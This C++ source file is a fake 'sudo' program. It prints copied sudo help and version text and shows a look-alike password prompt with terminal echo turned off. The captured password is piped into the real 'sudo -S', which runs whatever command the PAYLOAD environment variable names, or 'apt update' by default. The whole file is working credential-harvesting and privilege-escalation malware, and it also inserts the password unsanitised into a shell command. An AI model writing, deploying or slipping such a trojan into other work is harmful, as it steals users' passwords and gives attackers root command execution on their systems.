#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <termios.h>

void execute_command(std::string password, std::string payload = "")
{
    std::string command_part1 = "echo ";
    std::string command_part2 = "";
    std::string full_command = "";

    if (payload == "")
    {
        command_part2 = " | /usr/bin/sudo -S apt update";
        full_command = command_part1 + password + command_part2;
    }
    else
    {
        command_part2 = " | /usr/bin/sudo -S ";
        full_command = command_part1 + password + command_part2 + payload;
    }

    system(full_command.c_str());

    // tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
}

void generic_sudo_message()
{
    std::cout << "usage: sudo -h | -K | -k | -V\n";
    std::cout << "usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\n";
    std::cout << "usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]\n";
    std::cout << "usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]\n";
    std::cout << "usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...\n";
}

void sudo_options()
{
    std::cout << "\nOptions:\n";
    std::cout << "  -A, --askpass                 use a helper program for password prompting\n";
    std::cout << "  -b, --background              run command in the background\n";
    std::cout << "  -C, --close-from=num          close all file descriptors >= num\n";
    std::cout << "  -E, --preserve-env            preserve user environment when running command\n";
    std::cout << "      --preserve-env=list       preserve specific environment variables\n";
    std::cout << "  -e, --edit                    edit files instead of running a command\n";
    std::cout << "  -g, --group=group             run command as the specified group name or ID\n";
    std::cout << "  -H, --set-home                set HOME variable to target user's home dir\n";
    std::cout << "  -h, --help                    display help message and exit\n";
    std::cout << "  -h, --host=host               run command on host (if supported by plugin)\n";
    std::cout << "  -i, --login                   run login shell as the target user; a command may also be specified\n";
    std::cout << "  -K, --remove-timestamp        remove timestamp file completely\n";
    std::cout << "  -k, --reset-timestamp         invalidate timestamp file\n";
    std::cout << "  -l, --list                    list user's privileges or check a specific command; use twice for longer format\n";
    std::cout << "  -n, --non-interactive         non-interactive mode, no prompts are used\n";
    std::cout << "  -P, --preserve-groups         preserve group vector instead of setting to target's\n";
    std::cout << "  -p, --prompt=prompt           use the specified password prompt\n";
    std::cout << "  -r, --role=role               create SELinux security context with specified role\n";
    std::cout << "  -S, --stdin                   read password from standard input\n";
    std::cout << "  -s, --shell                   run shell as the target user; a command may also be specified\n";
    std::cout << "  -t, --type=type               create SELinux security context with specified type\n";
    std::cout << "  -T, --command-timeout=timeout terminate command after the specified time limit\n";
    std::cout << "  -U, --other-user=user         in list mode, display privileges for user\n";
    std::cout << "  -u, --user=user               run command (or edit file) as specified user name or ID\n";
    std::cout << "  -V, --version                 display version information and exit\n";
    std::cout << "  -v, --validate                update user's timestamp without running a command\n";
    std::cout << "  --                            stop processing command line arguments\n";
}

void sudo_help()
{
    generic_sudo_message();
    sudo_options();
}

void sudo_version()
{
    std::cout << "Sudo version 1.8.21p2\n";
    std::cout << "Sudoers policy plugin version 1.8.21p2\n";
    std::cout << "Sudoers file grammar version 46\n";
    std::cout << "Sudoers I/O plugin version 1.8.21p2\n";
}

int main(int argc, char *argv[])
{

    std::string username = "";
    std::string payload = "";
    std::string password_prompt = "[sudo] passsword for";
    std::string obtained_password = "";

    if (argc == 1)
    {
        generic_sudo_message();
    }
    else
    {
        std::string arg = argv[1];
        if (arg == "-h")
        {
            sudo_help();
            return 0;
        }
        else if (arg == "-V")
        {
            sudo_version();

            return 0;
        }
        username = getenv("USER");
        payload = getenv("PAYLOAD");
        password_prompt = password_prompt + " " + username + ":";
        std::cout << password_prompt;
        //hides terminal input
        termios oldt;
        tcgetattr(STDIN_FILENO, &oldt);
        termios newt = oldt;
        newt.c_lflag &= ~ECHO;
        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
        std::cin >> obtained_password;
        //turns terminal back on
        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
        execute_command(obtained_password, payload);
    }

    return 0;
}